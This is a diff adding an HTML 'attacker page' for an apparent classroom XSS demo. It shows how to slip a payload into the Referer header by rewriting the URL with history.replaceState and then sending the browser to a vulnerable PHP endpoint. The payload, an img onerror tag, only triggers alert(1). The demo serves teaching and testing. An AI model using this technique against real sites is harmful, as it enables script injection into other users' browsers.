@@ -1,0 +1,60 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Attacker page (safe vs unsafe referrer)</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 24px; max-width: 800px; }
+    .box { border: 1px solid #ddd; padding: 12px; border-radius: 6px; margin-top: 12px; }
+    button, a { margin-right: 12px; }
+  </style>
+</head>
+<body>
+  <h1>Attacker page — Safe vs Unsafe referrer demo</h1>
+
+  <div class="box">
+    <h3>1) Safe link (regular referrer)</h3>
+    <p>Clicking this sends a normal referrer (the current attacker page URL).</p>
+    <!-- Regular link - does not change attacker URL -->
+    <a id="safeLink" href="http://xssdemo/entrypoints/referer_header.php" target="_blank">Go to Victim (safe)</a>
+  </div>
+
+  <div class="box">
+    <h3>2) Unsafe link (payload in referrer)</h3>
+    <p>Clicking this will first change the attacker page URL (so the referrer includes the payload),
+       then navigate to the victim. The payload used here triggers <code>alert(1)</code></p>
+
+    <!-- Unsafe link triggers JS to change URL then navigate -->
+    <a id="unsafeLink" href="#" onclick="doUnsafe(event)">Go to Victim (unsafe)</a>
+   
+  </div>
+
+  <script>
+    // payload that we will place into the attacker's URL
+    const payload = 'AAA<img src="aaa.jpg"  onerror=alert(1) />BBB';
+
+    function doUnsafe(e) {
+      e.preventDefault();
+
+      // Option A: encode payload so URL stays valid and visually safe in the bar
+      // (browsers will percent-encode reserved chars, but replaceState stores the string you give)
+      const encoded = encodeURIComponent(payload);
+
+      // Option: use raw (unencoded) in replaceState — some browsers will encode it in the address bar.
+      // For demo robustness we use encoded form in the URL but the victim may see decoded or encoded referrer;
+      // if percent-encoded text is displayed (e.g. %3Cscript%3E...), try the console technique shown below.
+      const newUrl = '/attack?name=' + encoded;
+
+      // change the current URL without reloading (visible in address bar)
+      history.replaceState(null, '', newUrl);
+
+      // now navigate to victim; the browser will send the current attacker URL as the Referer header
+      window.location.href = 'http://xssdemo/entrypoints/referer_header.php';
+    }
+
+    // Optional: demonstrate an auto-click helper for teachers (uncomment to auto-redirect)
+    // window.addEventListener('load', () => document.getElementById('unsafeLink').click());
+  </script>
+</body>
+</html>
+
